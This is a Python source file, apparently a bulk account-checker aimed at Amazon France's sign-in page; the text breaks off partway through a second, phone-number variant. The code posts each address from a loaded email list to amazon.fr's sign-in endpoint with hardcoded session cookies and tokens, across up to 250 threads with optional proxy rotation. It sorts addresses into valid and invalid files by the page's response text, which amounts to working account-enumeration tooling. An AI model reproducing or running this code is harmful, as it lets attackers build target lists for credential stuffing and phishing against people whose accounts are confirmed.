import json
import os
import urllib3
import os.path
import platform
import json as jsond  # json
import random
import signal
import string
import pyasn1
import time  # sleep before exit
import psutil
import requests
import sys, hashlib, webbrowser, requests
from json import dumps
from requests import get, post, Session
from multiprocessing.dummy import Pool, Lock
from colorama import Fore, init
from time import sleep, strftime
from os import system, mkdir, path, name, _exit
from subprocess import check_output
from random import choice, randint
from json import JSONDecodeError

time1 = strftime("%m%d-%Y")
time2 = strftime("%H-%M-%S")
import zstandard
import binascii  # hex encoding
import requests  # https requests
import subprocess

from uuid import uuid4  # gen random guid

import webbrowser
import platform
import subprocess
import datetime
import datetime
import sys
import os
from colorama import Fore, Style, init, Back
from requests_toolbelt.adapters.fingerprint import FingerprintAdapter

# Initialization
init(convert=True, autoreset=True)
clearConsole = lambda: subprocess.call('cls||clear', shell=True)

def find_between_r( s, first, last ):
    try:
        start = s.rindex( first ) + len( first )
        end = s.rindex( last, start )
        return s[start:end]
    except ValueError:
        return ""

class Amazon:
    lock = Lock()
    valid = 0
    invalid = 0
    checked = 0
    recheck = 0
    loaded = 0
    cpm = 0
    proxyType = "http"
    proxyless = True

    def title():

        clearConsole()

    def console_title():
        while True:
            print("\n")

    def start(self):

        Amazon.valid = 0
        Amazon.invalid = 0
        Amazon.checked = 0
        Amazon.recheck = 0
        Amazon.loaded = 0
        Amazon.cpm = 0


        time.sleep(1)

        filename = input("Select your mail list: ")

        clearConsole()

        print(Fore.LIGHTYELLOW_EX + Style.BRIGHT + "Select your request options:")
        print(Fore.LIGHTYELLOW_EX + Style.BRIGHT + "1 > " + Fore.WHITE + "Proxyless (Not recommended)")
        print(Fore.LIGHTYELLOW_EX + Style.BRIGHT + "2 > " + Fore.WHITE + "With proxies")
        requestOptionsInput = input("> ")

        if requestOptionsInput == "1":
            self.proxyless = True
            pass
        else:
            print("\n Not Valid Option")
            time.sleep(3)
            Amazon().start()

        clearConsole()

        self.email = open(filename, encoding='utf-8', errors='ignore').read().split('\n')

        Amazon.loaded = len(self.email)


        try:

            print(Fore.LIGHTYELLOW_EX + Style.BRIGHT + "Select your request speed:")
            print(Fore.LIGHTYELLOW_EX + Style.BRIGHT + "1 > " + Fore.WHITE + "Brouteur (lent)")
            print(Fore.LIGHTYELLOW_EX + Style.BRIGHT + "2 > " + Fore.WHITE + "BMW M8 F92 cylindrée de 4,4 litres 625 ch (460 kW) (normal)")
            print(Fore.LIGHTYELLOW_EX + Style.BRIGHT + "3 > " + Fore.WHITE + "Usain Bolt (rapide)")

            threadInput = input("> ")

            if threadInput == "1":
                threads = 100
            elif threadInput == "2":
                threads = 200
            elif threadInput == "3":
                threads = 250
            else:
                print("\n Not Valid Option")
                time.sleep(3)
                Amazon().start()

        except:

            print(f"\nInvalid threads !")
            sleep(3)
            Amazon().start()

        Amazon.title()

        if not path.exists("results"):
            mkdir("results")
        if not path.exists("results/goods"):
            mkdir("results/goods")
        if not path.exists("results/bads"):
            mkdir("results/bads")
        if not path.exists("results/errors"):
            mkdir("results/errors")

        mainpool = Pool(processes=threads)
        mainpool.imap_unordered(self.Amazon, self.email)
        mainpool.close()
        mainpool.join()
        if Amazon.checked == Amazon.loaded:
            print(Fore.LIGHTYELLOW_EX + Style.BRIGHT + "\nFinished Larezed " + str(Amazon.checked) + " mails! |Goods: " + str(Amazon.valid) + " mails - Bads: " + str(Amazon.invalid) + " mails ! |Errors: " + str(Amazon.recheck), flush=True)
        print(Fore.LIGHTYELLOW_EX + Style.BRIGHT + "\nPress any key to continue:")
        r = input()
        main()

    def Amazon(self, email):

        data = {'appActionToken': 'Yq2mhgfDpdFgAc7Q0195zsKMhMgj3D',
                'appAction': 'SIGNIN_PWD_COLLECT',
                'subPageType': 'SignInClaimCollect',
                'openid.return_to': 'ape:aHR0cHM6Ly93d3cuYW1hem9uLmZyLz9yZWZfPW5hdl9zaWduaW4=',
                'prevRID': 'ape:MDU0NEE2SjhFRlFRUTYyN1dKVjQ=',
                'workflowState': 'eyJ6aXAiOiJERUYiLCJlbmMiOiJBMjU2R0NNIiwiYWxnIjoiQTI1NktXIn0.82kD-hdrp3qMJkrTTdkc7Kc08KLPQBHL_iQoQ2pjIS8D31IZSfbInA.90U5VKcKctZvMWjr.o5bTk4T5fy7FanxrQ70Wd9a7Yeg7j8PwNCf31MdIe_tCA2xU4aDIeFto4vZZ_WOuNIRDKX3wCSfPtNeRwWKZSYEf9iy5STM6hyqrBd8dn6HAj2scs056iFAFf6nbuTvZzZ4PMNkbe9XAlm49L9UhlE2WhNYp9J1C4v_BKloM8634tt3qqr6TJmE7sF2ALES8v27bQGYVbC0TT7gnvRhbd2J9KiXpNRw3ksFN9hxvbOmHSMd5yQ4LS9h8BxNWmO0d5_687P05l20JZ6TJHdY1-JD2aNnK4Gp96DGTQu2WYKexFuz0-wo3RJVqcJJUGQTTIKz9._B41CuwhGFlx-f0Rgma_bA',
                'email': email,
                'password': '',
                'create': '0',
                'metadata1': 'ECdITeCs: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'}
        headers = {
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "fr,en-US;q=0.9,en;q=0.8",
            "cache-control": "max-age=0",
            "content-length": "9702",
            "content-type": "application/x-www-form-urlencoded",
            "cookie": 'signin-sso-state-fr=9a588507-c1d0-47d2-9b4e-24660962a172; session-id=259-0765909-8490911; ubid-acbfr=257-0984503-1653536; s_cc=true; s_nr=1628038460339-New; s_vnum=2060038460339%26vn%3D1; s_dslv=1628038460342; s_sq=%5B%5BB%5D%5D; s_ppv=28; lc-acbfr=fr_FR; sst-acbfr=Sst1|PQF8-IR2JwMpPCYbuYCWXsn0CUByhtpw3G-ru2dOH1cCAwob0wV9_PHM53N5vhYwOh_10q-TmrnyJiDIubhN1vQRwdPX6zr81XepEK4gwVCPuknVsOTraJuLC0KTDLWGpSH1zA7fOq5sI8sp8fDRlnH1nLMf1LgfkKNoSMXBG-bfJLJhyF5VfnhJ_ARRFXOqeEDXqYsSFjZOevjChkRdY4s7xdFORfxpv-R00B-KXv6bpxR5aMOjnQqHGWrJlldWQaAaFYqSpQ-DsuQfb4D5C1_Mrnc7AKc8KU9WPCsuxnvlu1w; i18n-prefs=EUR; session-token="79xix76gKPVVnFiaW9dcHSh+Um4/4J7yi5BR0BAjliXf2Cun5JLeD2BpFKgO1kZsu6ialy8NtAj9qauNFQgn7fHycrZVdsrloQ80RCMZAHbt/T1mWOxDYofcMLA46ZrcaBo1ad7d4dhlfpsZpeEYXjY6OrkE2oZJXv8GCZ3b64qVcmNDT6GuNEdiQSApa9f1CWCU/DwpfDeFd96cXaZltct5FJuJJ1PCv5++TQHAXogh56Hp4H6dkOetF2AAXHzc2cHoMDZFvQ0="; session-id-time=2259697171l; csm-hit=tb:CCFXXEQY6J81PR2CX5JM+b-1QVH157HS0JKGH9N9B30|1628977179563&t:1628977179563&adb:adblk_yes',
            "downlink": "10",
            "ect": "4g",
            "origin": "https://www.amazon.fr",
            "referer": "https://www.amazon.fr/ap/signin?openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.fr%2F%3Fref_%3Dnav_signin&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=frflex&openid.mode=checkid_setup&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&",
            "rtt": "150",
            "sec-ch-ua": '"Chromium";v="92", " Not A;Brand";v="99", "Google Chrome";v="92"',
            "sec-ch-ua-mobile": "?0",
            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": "same-origin",
            "sec-fetch-user": "?1",
            "upgrade-insecure-requests": "1",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36"}

        try:

            if self.proxyless:
                req = post("https://www.amazon.fr/ap/signin", data=data, headers=headers, timeout=10).text
            else:

                proxy_form = {}
                proxy = choice(self.proxies)
                if proxy.count(':') == 3:
                    spl = proxy.split(':')
                    proxy = f'{spl[2]}:{spl[3]}@{spl[0]}:{spl[1]}'
                else:
                    proxy = proxy
                if proxy in ['', '\n']:
                    try:
                        self.proxylist.remove(proxy)
                        pass
                    except:
                        pass
                if self.proxyType in ['https', 'http']:
                    proxy_form = {'http': f"http://{proxy}", 'https': f"https://{proxy}"}
                elif self.proxyType in ['socks4', 'socks5']:
                    line = f"{self.proxyType}://{proxy}"
                    proxy_form = {'http': line, 'https': line}

                req = post("https://www.amazon.fr/ap/signin", data=data, headers=headers, timeout=10, proxies=proxy_form).text

            if "Entrez votre mot de passe" in req or "Réinitialisation du mot de passe requise" in req:

                Amazon.valid += 1
                Amazon.checked += 1

                with Amazon.lock:
                    print(Fore.GREEN + f"[OK]", flush=True)
                    open(f"results/goods/Amazon[{time1} at {time2}].txt", "a+", encoding='utf-8',
                         errors='ignore').write(f"{email}\n")

            elif "Impossible de trouver un compte correspondant à cette adresse e-mail" in req or "Le numéro de téléphone que vous avez saisi ne peut pas être utilisé pour vous identifier. Vérifiez que le numéro que vous avez saisi est correct ou identifiez-vous plutôt avec votre adresse e-mail." in req:

                Amazon.invalid += 1
                Amazon.checked += 1

                with Amazon.lock:
                    print(Fore.RED + f"[X]")
                    open(f"results/bads/Amazon[{time1} at {time2}].txt", "a+", encoding="utf-8", errors="ignore").write(f"{email}\n")

            else:
                Amazon.recheck += 1
                Amazon.checked += 1

                with Amazon.lock:
                    print(Fore.RED + f"[X]")
                    open(f"results/errors/Amazon[{time1} at {time2}].txt", "a+", encoding='utf-8',
                         errors='ignore').write(f"{email}\n")

        except:

            Amazon.recheck += 1
            Amazon.checked += 1
            with Amazon.lock:
                open(f"results/errors/Amazon[{time1} at {time2}].txt", "a+", encoding="utf-8", errors="ignore").write(f"{email}\n")

class AmazonNum:
    lock = Lock()
    valid = 0
    invalid = 0
    checked = 0
    recheck = 0
    loaded = 0
    cpm = 0
    proxyType = "http"
    proxyless = True

    def title():

        clearConsole()

    def console_title():
        while True:
            print("\n")
    def start(self):

        AmazonNum.valid = 0
        AmazonNum.invalid = 0
        AmazonNum.checked = 0
        AmazonNum.recheck = 0
        AmazonNum.loaded = 0
        AmazonNum.cpm = 0


        time.sleep(1)

        filename = input("Select Phone-List: ")

        clearConsole()
        print(Fore.LIGHTRED_EX + """\
  
       
          ▄▄▄▄▄   ▄      ▄   █    █    ▀▄    ▄     ██   █▀▄▀█ ██   ▄▄▄▄▄▄   ████▄    ▄   
         █     ▀▄  █      █  █    █      █  █      █ █  █ █ █ █ █ ▀   ▄▄▀   █   █     █  
       ▄  ▀▀▀▀▄ █   █ ██   █ █    █       ▀█       █▄▄█ █ ▄ █ █▄▄█ ▄▀▀   ▄▀ █   █ ██   █ 
        ▀▄▄▄▄▀  █   █ █ █  █ ███▄ ███▄    █        █  █ █   █ █  █ ▀▀▀▀▀▀   ▀████ █ █  █ 
                █▄ ▄█ █  █ █     ▀    ▀ ▄▀            █    █     █                █  █ █ 
                 ▀▀▀  █   ██                         █    ▀     █                 █   ██ 
                                                    ▀          ▀                        
                                                    
                                                                                                                                                                                     
                        """)
        print(Fore.LIGHTYELLOW_EX + "_______________________________________________________________________________________________________________")   
        print("")          
        print("")         
        print(Fore.LIGHTYELLOW_EX + Style.BRIGHT + "     (1)  " + Fore.LIGHTRED_EX + "SANS PROXY")
        print(Fore.LIGHTYELLOW_EX + Style.BRIGHT + "     (2)  " + Fore.LIGHTRED_EX + "AVEC PROXY")
        print("")
        requestOptionsInput = input(Fore.LIGHTYELLOW_EX + "Choose: ")

        if requestOptionsInput == "1":
            self.proxyless = True
            pass

        else:
            print("\n Not Valid Option")
            time.sleep(3)
            AmazonNum().start()

        clearConsole()

        self.email = open(filename, encoding='utf-8', errors='ignore').read().split('\n')

        AmazonNum.loaded = len(self.email)


        try:
            print(Fore.LIGHTRED_EX + """\
  
           
              ▄▄▄▄▄   ▄      ▄   █    █    ▀▄    ▄     ██   █▀▄▀█ ██   ▄▄▄▄▄▄   ████▄    ▄   
             █     ▀▄  █      █  █    █      █  █      █ █  █ █ █ █ █ ▀   ▄▄▀   █   █     █  
           ▄  ▀▀▀▀▄ █   █ ██   █ █    █       ▀█       █▄▄█ █ ▄ █ █▄▄█ ▄▀▀   ▄▀ █   █ ██   █ 
            ▀▄▄▄▄▀  █   █ █ █  █ ███▄ ███▄    █        █  █ █   █ █  █ ▀▀▀▀▀▀   ▀████ █ █  █ 
                    █▄ ▄█ █  █ █     ▀    ▀ ▄▀            █    █     █                █  █ █ 
                     ▀▀▀  █   ██                         █    ▀     █                 █   ██ 
                                                        ▀          ▀                        
                                                        
                                                                                                                                                                                         
                        """)
            print(Fore.LIGHTYELLOW_EX + "_______________________________________________________________________________________________________________")   
            print("")          
            print("")
            print(Fore.LIGHTYELLOW_EX + Style.BRIGHT + "     (1)  " + Fore.LIGHTRED_EX + "LENT")
            print(Fore.LIGHTYELLOW_EX + Style.BRIGHT + "     (2)  " + Fore.LIGHTRED_EX + "SEMI-LENT")
            print(Fore.LIGHTYELLOW_EX + Style.BRIGHT + "     (3)  " + Fore.LIGHTRED_EX + "RAPIDE")
            print("")

            threadInput = input(Fore.LIGHTYELLOW_EX + "\nChoose: ")

            if threadInput == "1":
                threads = 1
            elif threadInput == "2":
                threads = 200
            elif threadInput == "3":
                threads = 250
            else:
                print("\n Not Valid Option")
                time.sleep(3)
                AmazonNum().start()

        except:

            print(f"\nInvalid threads !")
            sleep(3)
            AmazonNum().start()


        AmazonNum.title()

        if not path.exists("results"):
            mkdir("results")
        if not path.exists("results/goods"):
            mkdir("results/goods")
        if not path.exists("results/bads"):
            mkdir("results/bads")
        if not path.exists("results/errors"):
            mkdir("results/errors")

        mainpool = Pool(processes=threads)
